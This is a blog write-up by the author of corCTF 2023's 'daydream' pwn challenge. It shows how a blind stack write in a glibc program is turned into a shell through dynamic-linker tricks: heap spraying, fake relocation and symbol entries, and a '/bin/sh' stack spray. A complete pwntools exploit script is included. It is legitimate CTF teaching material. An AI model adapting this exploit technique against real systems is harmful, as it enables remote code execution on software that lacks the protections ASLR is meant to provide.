---
来源: https://pepsipu.com/blog/2023-08-daydream
类型: html
获取日期: 2026-09-12
---

 

---

daydream: turning stack OOB into universal RCE without ever leaking memory

author writeup to corCTF 2023’s unsolved pwnable, where competitors must exploit a previously unexploitable primitive: universal blind stack write

August 5, 2023

cs

---

# Introduction

I’ve always liked problems that were easy to state but hard to solve. The
barrier for entry to corCTF pwn challenges are typically very high—µarch and
kernel are large departures from the more comfortable heap notes, so “daydream”
as was designed to be more accessible. This was not at the cost of difficulty.
At the end of the CTF, it was one of the two pwn challenge to remain unsolved.

“daydream” is a short glibc pwnable. In fact, here’s the source code for the
challenge:

```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    uint8_t bytes[16] = {0};
    size_t idx, value = 0;

    setbuf(stdin, malloc(0x2000));

    while (!bytes[0])
    {
        scanf("%ld %ld", &idx, &value);
        bytes[idx] = value;
    }

}
```

The description and name of the challenge hints at its relationship with
“[nightmare](https://blog.pepsipu.com/posts/nightmare)”, my challenge for
DiceCTF 2022 (this writeup does not require understanding it, however it is
strongly encouraged). This was a nudge and indicator that this is also a linker
challenge.

In short, the linker—also fancily called the runtime loader or dynamic linker to
distinguish it from the compile-time linker—is the program that loads programs
into memory. Typically, you’ll see this as some form of “ld-linux-x86-64.so.2”
loaded as a shared library. All non-statically compiled programs use the linker,
making it a near universal attack surface.

A less subtle indicator for the linker, this challenge is also blind with all
protections enabled. The executor for this challenge does not provide stdout, so
all exploitation must occur without knowing any addresses in memory. Previously,
there weren’t general strategies for blind-fullprot challenges (how does one
encode executing a onegadget or system without specifying where either are
located in memory?). Linker exploits can help with that! For example,
[ret2dlresolve](https://hackmd.io/@v13td0x/ret2dlresolve) is already a
well-known and used trick.

# First Steps

The program allows you to write whatever byte you want a relative offset from a
stack buffer. Writing anything that’s not 0 to index 0 causes the program to
return. It has all protections enabled, hides stdout, and has anti-bruteforce
protection.

First off, the only complex surface accessed before returning is “scanf”.
However, it doesn’t use the values of anything we can write on the stack, so we
cannot interfere with it. Similarly, returning from main doesn’t access stack
variables. This means we must modify the return address. Because of the
anti-bruteforce protection, we can only expect the bottom 12 bits to be
constant. This means, as a first step, we can only modify the least significant
byte, or LSB, of the return address for a consistent exploit.

# LSB overwrite on `__libc_start_call_main+128`

This is our return address.
![the return address dawg](https://i.gyazo.com/5832fb920e16332979ba102e04372605.png)
We can return anywhere in a 255 byte range by setting the last byte `90` to any
value between `00` and `ff`. But where will we return? We can view all the
options here: ![](https://i.gyazo.com/85e2c3472ef0127323e9d793389a10ee.png)

Well, what do we want out of the code that we’ll return to? It’ll *have* to
reference data on the stack, since there’s simply not enough entropy in the
registers we affect to encode “give me a shell”.

Some attempts included jumping to `b2` since we control the syscall number, but
we don’t have sufficient control over the other registers to any meaningful
syscall besides `sigreturn`. However, even with `sigreturn`, we can’t construct
a valid instruction pointer, so this avenue isn’t useful.

Another, more fruitful attempt, is to rewind just a few bytes back in
`__libc_start_call_main`, to `76`.
![](https://i.gyazo.com/6b0abbb943f7cd5b38eef801e3fb77b0.png)

Here, we load local variables off the stack and call `[rsp+8]`. This is the main
function, and the arguments to it are the argument count, arguments, and the
environment variables. These, except for the enviroment variables, are also held
on the stack. Using `76` intuitively makes sense, because we know before calling
`main` (where our return pointer is near) we need to load the function and its
arguments, a process we can easily interfere with.

# Neighbors of `main`

We can modify `argc` and `argv` on the stack, as well as the pointer to `main`.
We are in a similar situation now, able to call anything in a 255 byte range
near `main` by modifying its LSB, but also with argument control. What should we
call? Here are our options:
![](https://i.gyazo.com/43e933100cc552c9caaed42b2b6ede1c.png)

There are two interesting targets here: `scanf@plt`, and the PLT trampolines.

Ideally, we could call `scanf` with arguments we control and get a format string
exploit. However, since `argc` is 4 bytes, it can’t hold a pointer. Perhaps, in
a different world, `argv` is the first argument to the main function, making
this challenge trivial :P

## PLT functions

I discuss PLT functions more in my writeup to
[nightmare](https://blog.pepsipu.com/posts/nightmare), but the gist is that
there are two code segments for each symbol: `.plt` functions and PLT
trampolines. `.plt` functions are just jumps to whatever’s being held in the GOT
entry associated with this symbol. This is what functions like `main` call into.
For example, here’s the `.plt` function associated with `scanf`.

![](https://i.gyazo.com/02b93888c4ad443533106e66ddd51f94.png)

PLT trampolines are the **initial value of a symbol’s GOT entry**, which calls a
“resolver” function (such as `_dl_runtime_resolve_fxsave`) that overwrites the
GOT entry with the actual address of the symbol in the library (such as `system`
or `scanf`). They are typically structed as a push of the index associated with
the symbol and jump to the resolver dispatcher. We won’t go into how these
indicies are used right now. The resolver dispatcher just jumps to
`_dl_runtime_resolve_fxsave`, which will take the index and translate it to an
the actual function address. Here’s the PLT trampoline for `scanf`. We can see
that the index associated with `scanf` is `0x3`:

![](https://i.gyazo.com/ea70af3e92921a2605be70e6497ee97b.png)

And the dispatcher, at `020`:
![](https://i.gyazo.com/b69f08a33b70f177744c2e5bff52fbd7.png)

We can see in the GOT that most symbols are resolved, while `__stack_chk_fail`
still points to its PLT trampoline. This makes sense, since the GOT entry hasn’t
been overwritten by the resolver:
![](https://i.gyazo.com/d09b2f32228382f41a44a6803c161da7.png)

To summarize, `.plt` functions call whatever’s in the GOT. PLT trampolines put
stuff in the GOT and call external symbols. They jump to the

At this point, you might start brewing an interesting—but nearly
impossible—plan. “If we could call the resolver dispatcher, at `20`, with our
*own* index, `argc`, perhaps we could have our own symbol resolved, like
`system`?”, many competitors thought.

Moonshine! That can’t be possible. First off, the calling convention for the
resolver dispatcher uses stack arguments, not registers. If we called the
dispatcher, we’d end up pushing the return address of the call rather than the
index we wanted to use. Besides, the indexes, like `scanf`’s `0x3`, are used to
index tables, such as `symtab` or `strtab`, stored in the binary. Even if you
could index those tables out-of-bounds, it wouldn’t matter, since you don’t
control anything inside the binary. It’s just not possible.

# Overlapping Stack Frames and Heap Sprays

First, we need to figure out how to jump to `20` rather than calling it. This is
so we don’t push a return address on the stack, preventing us from specifying an
arbitrary index.

## Prologue Skipping

When calling a function, the epilogue assumes the size of the stack frame.
Specifically, it assumes the stack has grown by the amount the prologue of the
function has defined. In the case of the main function, the prologue looks like:

![](https://i.gyazo.com/c94c621edd4c89e0bb8bd30afd76418d.png) The three pushes
and `sub rsp, 0x30` cause the stack frame to be `0x48` bytes. The epilogue,
similarily, does `add rsp, 0x30` and three pops:

![](https://i.gyazo.com/a70966f863123adf306e89e63f9a8ef3.png)

However, if we called `main+16`, for example, skipping a few pushes in the
prologue of the function, the epilogues assumptions on the stack frame’s size is
invalidated. The prologue didn’t grow the stack frame as much as the epilogue
assumes, causing the epilogue to eat in the previous functions stack frame. We
can select the number of pushes we’d like to skip to overlap our stack frame
with the previous one.

In this case, we can skip two pushes to overlap the return address of `main`’s
stack frame with the local variable, `main`, in `__libc_start_call_main`’s stack
frame. This is the main function `__libc_start_call_main` calls. By tweaking the
LSB of `main`, we can return into the PLT dispatcher! Writing the index we’d
like to use under this return address allows us to emulate pushing it to the
stack.

## `stdin` Spraying

Okay, that’s cool, but what’s the point if the index won’t point to our data?
Well, if you’ve read
[this writeup on zelda](https://jonathankeller.net/ctf/zelda/) (or perhaps seem
many `vmmap`s before), you’ll know that the heap is awfully close to the loaded
binary. Sure enough, if you look at the
[kernel source](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c#L1031),
the heap is a random offset from the end of the binary, in the range from
`(0x0, 0x2000000)`.

We do control data on the heap. `scanf` requests characters from the
`_IO_2_1_stdin_` object, which reads bytes in chunks of in `0x2000`. One
strategy we could try is creating a fake relocation object on the heap, and then
guess the offset to index it. However, this requires bruteforce! What can we do?

By repeatedly calling the `main` function in a loop, we can keep creating new
backing buffers for `stdin`. We can fill all `0x2000` bytes, repeating our
symbol object at intervals of `0x1000`. If we do this 4096 times, then we’d
allocate `0x2000000` bytes of controlled data. If we then supply an index that’s
`0x2000000` bytes off the end of the binary, we’re guaranteed to read the symbol
either at the start of the heap, or the end of the heap. Spraying is a powerful
technique that can often get around ASLR!

To summarize what we’ve done so far, we’ve overwritten the LSB of the return
address to rewind `__libc_start_call_main` so that it reads the address of
`main` off the stack. It will continually call `main`, spraying the `stdin`
input buffer over the heap. We then change the address of `main`’s LSB on the
stack so it points to `main+16`. Then, when `main` returns, we call `main+16`.
We change the return address, also `main+16`, to the resolver dispatcher. We
also write the index of the maximum heap offset, `0x2000000`, under the return
address. After `main+16` returns, it’ll jump to the dispatcher with the index at
the top of the stack.

# Symbol Resolution to RCE

Calling an arbitrary symbol isn’t enough to get remote code execution. Even if
you can call `system`, what does it matter if you can’t control what `rdi`
points to? We can’t call a one gadget since it’s not a well defined symbol, and
even if we could, the constraints aren’t satisfied. If only it was possible to
modify the register state somehow…

## Modifying `_dl_runtime_resolve_xsavec`’s internal state

The underlying resolver called by the resolver dispatcher is a wrapper around
the function `_dl_fixup`. It first stores all the registers interal state on the
stack, calls `_dl_fixup` using the stack arguments, and then restores the
register state. The idea behind it is that `_dl_fixup` is a foriegn function
that may clobber the program state in unexpected ways, so we account for that by
saving the state to the stack.

By creating a symbol which calls into `main` (again) using a `STT_GNU_IFUNC`, we
can not only modify the local variables of `_dl_fixup`, but also register state
stored by `_dl_runtime_resolve_xsavec`. Specifically, with an LSB overwrite, we
can cause the resolved symbol, `_dl_fixup`’s return value, to be the resolver
dispatcher, allowing us to call `_dl_fixup` on the next index on the stack. This
is useful, because we can modify the register state with our stack write before
calling into the dispatcher.

## Stack Spraying “/bin/sh”

Specifically, we’d like to get `rdi` pointing at “/bin/sh”. `rdi` is set to a
stack buffer used by `scanf` for storing the last read value. We can modify the
saved `rdi` in `_dl_runtime_resolve_xsavec`, setting its last two bytes to `00`.
The overall effect is that `rdi` points much higher on the stack, safe from
getting clobbered by `_dl_fixup` when we call `system`. We can then spray
`0x10000 / 8` “/bin/sh”s over the stack, and we’ll be guarenteed to have `rdi`
point to them once `_dl_runtime_resolve_xsavec` restores it. From there, we just
choose a different symbol index that’ll resolve `system`.

# Exploit Code

Let’s put this into action, calling a symbol we desire. I’m skipping over a few
implementation details (Technically the allocation size is `0x2010`, since the
chunk header occupies `0x10` bytes. This means we need to shift around our spray
inside the input buffer to stay aligned to `0x1000` byte boundaries.
Additionally, because we have to have valid indicies for tables of different
sizes, we need to have larger sprays. For example, if we index a table with
1-byte-sized elements at index `0x2000000`, indexing a table with 2-byte-sized
elements would be at the logical byte offset `0x2000000 * 2`, or `0x4000000`).

First, I’ll create a wrapper for the payload creation. It’ll make creating
sprays easier.

```
class Buffer(io.BytesIO):
    # fills the rest of the stdin buffer
    def commit(self):
        self.write(b"\x00" * (0x2000 - (self.tell() % 0x2000)))

    def swrite(self, where, what):
        self.write(f"{where} {what}".encode() + b"\n")

    def write_bytes(self, where, what):
        for i in range(len(what)):
            self.swrite(where + i, what[i])
buf = Buffer()
```

Then, I’ll define some constants for the location of the return address,
`__libc_start_call_main+128`, and the local variable `main` in
`__libc_start_call_main`.

```
ret_addr = 0x38
main_addr = ret_addr + 0x10
```

Now, I’ll calculate the required indices for each table:

```
maximum_heap_offset = 0x2000000

payload_offset = (
    maximum_heap_offset + 0x5000 + 0xBA8
)  # offset from start of binary space
assert (payload_offset - bin.dynamic_value_by_tag("DT_JMPREL")) % 0x18 == 0

plt_idx = (
    payload_offset - bin.dynamic_value_by_tag("DT_JMPREL")
) // 0x18  # offset from start of binary space
symtab_idx = (
    payload_offset + 0x18 - bin.dynamic_value_by_tag("DT_SYMTAB")
) // 0x18  # offset from start of binary space
ver_idx = (payload_offset + 0x18 - bin.dynamic_value_by_tag("DT_VERSYM")) // 0x2


strtab_idx = (
    payload_offset + 0x18 * 2 + 0x8 - bin.dynamic_value_by_tag("DT_STRTAB")
)  # offset from start of binary space
```

We’ll then actually create the symbol structures, into a simple sprayable
`payload`.

```
fake_symtab_entry = (
    p32(0x17) + p8(10) + p8(1) + p16(0) + p64(bin.symbols["main"]) + p64(0)
) + (p32(strtab_idx) + p8(10) + p8(0) + p16(0) + p64(0xDEADBEEF) + p64(0))
fake_reloc_entry = (p64(0x4018) + p32(7) + p32(ver_idx) + p64(0)) + (
    p64(0x4018) + p32(7) + p32(ver_idx + 1) + p64(0)
)
fake_vertab_entry = p64(0x03) + b"system\x00"
payload = fake_reloc_entry + fake_vertab_entry
```

We’ll then actually spray this payload over the heap, at intervals of `0x1000`.

```
for i in range(maximum_heap_offset // 0x2000 * 0xC):
    # write payload at offsets
    symtab_offset = 0x908 + 0xF0
    reloc_symtab_offset = 0x908
    # create series of writes and the indexes they need to be written at
    payload_offsets = sorted(
        [
            ((reloc_symtab_offset - i * 0x10) % 0x2000, payload),
            ((reloc_symtab_offset + 0x1000 - i * 0x10) % 0x2000, payload),
            ((symtab_offset - i * 0x10) % 0x2000, fake_symtab_entry),
            ((symtab_offset + 0x1000 - i * 0x10) % 0x2000, fake_symtab_entry),
        ],
        key=lambda x: x[0],
    )

    spray_buf = Buffer()
    spray_buf.truncate(0x2000)
    for offset, dat in payload_offsets:
        if offset > 0x2000 - len(dat):
            continue
        spray_buf.seek(offset)
        spray_buf.write(dat)

    spray_buf.seek(0)

    spray_buf.swrite(ret_addr, 0x76) # recall main on ret
    spray_buf.swrite(0, 0xFF)
    buf.write(spray_buf.getvalue())
    buf.commit()
```

Now that we’ve sprayed our symbol data over the heap, we call overlap the stack
frames of `main` and `__libc_start_call_main`:

```
# set lsb to main+0x10 to misalign the stack by 0x10 bytes
buf.swrite(main_addr, 0xD0)
# set lsb of __libc_start_call_main to recall main+0x10
buf.swrite(ret_addr, 0x76)
# set edi to large malloc (local variable argc by __libc_start_call_main)
buf.write_bytes(main_addr + 0x8 + 0x4, p32(0x2000))

buf.swrite(0, 0xFF)
buf.commit()
```

After we’ve returned from `main`, we’ll modify the return address of `main+16`
to point to the resolver dispatcher.

```
# reset
buf.swrite(0, 0)
# plt resolver addr
buf.swrite(ret_addr, 0x20)
# set plt index, which should be on the heap. this'll call main
buf.write_bytes(ret_addr + 0x8, p64(plt_idx))
# this'll also call main. it's for stack alignment.
buf.write_bytes(ret_addr + 0x10, p64(plt_idx))
# this'll call system.
buf.write_bytes(ret_addr + 0x18, p64(plt_idx + 1))
buf.swrite(0, 0xFF)

buf.commit()
```

Now, once we’re in the main invoked within `_dl_fixup`, we’ll modify internal
state of `_dl_fixup` and `_dl_runtime_resolve_xsavec`.

```
# hop _dl_fixup to alternate branch that uses stack variable for return value
buf.swrite(ret_addr, 0xA4)
# set lsb of return value of _dl_fixup to dispatch resolver
buf.swrite(ret_addr + 0x10, 0x20)

# set saved rdi bottom two bytes to 0000
buf.write_bytes(0xA0, p16(0x0000))

buf.swrite(0, 1)
buf.commit()
```

We’ll spray “/bin/sh” over where `rdi` points in the next iteration of `main`.

```
spray = b"/bin/sh\x00" * 0x2000
buf.write_bytes(-0x10000, spray)
buf.swrite(0, 1)
buf.commit()
```

Now, the next input proccessed will be by `/bin/sh`! Let’s get the flag and win.

```
buf.write(b"cat /flag\nexit\n")
```

Here’s the exploit in its entirety.

```
from pwn import *
import io

bin = ELF("./daydream")
# r = process(bin.path)

# r = remote("localhost", 5000)
# r = process(["python3", "main.py"])
# gdb.attach(r, "break *_dl_fixup+81\nbreak *main+152")
# gdb.attach(r, "break *_dl_fixup+608\nbreak *_dl_runtime_resolve_xsavec+186")


class Buffer(io.BytesIO):
    def commit(self):
        self.write(b"\x00" * (0x2000 - (self.tell() % 0x2000)))

    def swrite(self, where, what):
        self.write(f"{where} {what}".encode() + b"\n")

    def write_bytes(self, where, what):
        for i in range(len(what)):
            self.swrite(where + i, what[i])


buf = Buffer()

ret_addr = 0x38
main_addr = ret_addr + 0x10
maximum_heap_offset = 0x2000000

payload_offset = (
    maximum_heap_offset + 0x5000 + 0xBA8
)  # offset from start of binary space
assert (payload_offset - bin.dynamic_value_by_tag("DT_JMPREL")) % 0x18 == 0

plt_idx = (
    payload_offset - bin.dynamic_value_by_tag("DT_JMPREL")
) // 0x18  # offset from start of binary space
symtab_idx = (
    payload_offset + 0x18 - bin.dynamic_value_by_tag("DT_SYMTAB")
) // 0x18  # offset from start of binary space
ver_idx = (payload_offset + 0x18 - bin.dynamic_value_by_tag("DT_VERSYM")) // 0x2


strtab_idx = (
    payload_offset + 0x18 * 2 + 0x8 - bin.dynamic_value_by_tag("DT_STRTAB")
)  # offset from start of binary space


fake_symtab_entry = (
    p32(0x17) + p8(10) + p8(1) + p16(0) + p64(bin.symbols["main"]) + p64(0)
) + (p32(strtab_idx) + p8(10) + p8(0) + p16(0) + p64(0xDEADBEEF) + p64(0))
fake_reloc_entry = (p64(0x4018) + p32(7) + p32(ver_idx) + p64(0)) + (
    p64(0x4018) + p32(7) + p32(ver_idx + 1) + p64(0)
)
fake_vertab_entry = p64(0x03) + b"system\x00"
payload = fake_reloc_entry + fake_vertab_entry


for i in range(maximum_heap_offset // 0x2000 * 0xC):
    # write payload at offsets
    # reloc_symtab_offset = 0x908
    symtab_offset = 0x908 + 0xF0
    reloc_symtab_offset = 0x908
    payload_offsets = sorted(
        [
            ((reloc_symtab_offset - i * 0x10) % 0x2000, payload),
            ((reloc_symtab_offset + 0x1000 - i * 0x10) % 0x2000, payload),
            ((symtab_offset - i * 0x10) % 0x2000, fake_symtab_entry),
            ((symtab_offset + 0x1000 - i * 0x10) % 0x2000, fake_symtab_entry),
        ],
        key=lambda x: x[0],
    )

    spray_buf = Buffer()
    spray_buf.truncate(0x2000)
    for offset, dat in payload_offsets:
        if offset > 0x2000 - len(dat):
            continue
        spray_buf.seek(offset)
        spray_buf.write(dat)

    spray_buf.seek(0)

    spray_buf.swrite(ret_addr, 0x76)
    spray_buf.swrite(0, 0xFF)
    buf.write(spray_buf.getvalue())
    buf.commit()

# set lsb to main+0x10 to misalign the stack by 0x10 bytes
buf.swrite(main_addr, 0xD0)
# set lsb of __libc_start_call_main to recall main+0x10
buf.swrite(ret_addr, 0x76)
# set edi to large malloc (local variable argc by __libc_start_call_main)
buf.write_bytes(main_addr + 0x8 + 0x4, p32(0x2000))

buf.swrite(0, 0xFF)
buf.commit()

# reset
buf.swrite(0, 0)
# plt resolver addr
buf.swrite(ret_addr, 0x20)
# set plt index, which should be on the heap. this'll call main
buf.write_bytes(ret_addr + 0x8, p64(plt_idx))
# this'll also call main. it's for stack alignment.
buf.write_bytes(ret_addr + 0x10, p64(plt_idx))
# this'll call system.
buf.write_bytes(ret_addr + 0x18, p64(plt_idx + 1))
buf.swrite(0, 0xFF)

buf.commit()

# hop dl_fixup to alternate branch that uses stack variable for return value
buf.swrite(ret_addr, 0xA4)
# set lsb of return value of _dl_fixup to dispatch resolver
buf.swrite(ret_addr + 0x10, 0x20)

# set saved rdi bottom two bytes to 0000
buf.write_bytes(0xA0, p16(0x0000))

buf.swrite(0, 1)
buf.commit()

buf.swrite(ret_addr, 0xA4)
buf.swrite(ret_addr + 0x10, 0x20)


spray = b"/bin/sh\x00" * 0x2000
buf.write_bytes(-0x10000, spray)
buf.swrite(0, 1)
buf.commit()

buf.write(b"cat /flag\nexit\n")

# write buf to file
with open("exploit", "wb") as f:
    f.write(buf.getvalue())
```

# Conclusion

Linker exploits are really neat. They can make unsolvable challenges solvable,
thanks to their ASLR independent nature. I hope this inspires you to poke around
in `_dl_fixup` yourself :D